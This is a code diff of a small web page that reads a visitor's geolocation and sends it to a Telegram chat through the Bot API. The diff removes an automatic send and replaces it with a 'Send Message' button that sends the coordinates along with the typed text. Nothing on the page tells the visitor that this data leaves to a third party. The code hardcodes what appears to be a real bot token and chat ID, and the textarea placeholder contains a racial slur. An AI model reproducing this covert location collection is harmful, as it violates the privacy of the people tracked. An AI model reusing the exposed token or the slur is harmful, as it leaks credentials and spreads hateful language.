@@ -8,7 +8,12 @@
     <button onclick="getLocation()">Get Location</button>
     <p id="location"></p>
     
+    <textarea id="userMessage" placeholder="nigaa nigga"></textarea>
+    <button onclick="sendMessage()">Send Message</button>
+
     <script>
+        var latitude, longitude;
+
         function getLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -18,14 +23,11 @@
         }
         
         function showPosition(position) {
-            var latitude = position.coords.latitude;
-            var longitude = position.coords.longitude;
+            latitude = position.coords.latitude;
+            longitude = position.coords.longitude;
             document.getElementById("location").innerHTML = 
             "Latitude: " + latitude + 
             "<br>Longitude: " + longitude;
-
-            // Send location to Telegram bot
-            sendLocationToTelegram(latitude, longitude);
         }
 
         function showError(error) {
@@ -45,10 +47,15 @@
             }
         }
 
-        function sendLocationToTelegram(latitude, longitude) {
+        function sendMessage() {
+            var userMessage = document.getElementById("userMessage").value;
+            sendLocationToTelegram(latitude, longitude, userMessage);
+        }
+
+        function sendLocationToTelegram(latitude, longitude, userMessage) {
             var botToken = '7290471633:AAE0A_sbbmf8Z-Xm-1hsk7DCtXezNGiCpVk';
             var chatId = '-1002148840772';
-            var message = `User location: Latitude: ${latitude}, Longitude: ${longitude}`;
+            var message = `User location: Latitude: ${latitude}, Longitude: ${longitude}\nMessage: ${userMessage}`;
 
             // URL to send message to Telegram chat
             var telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
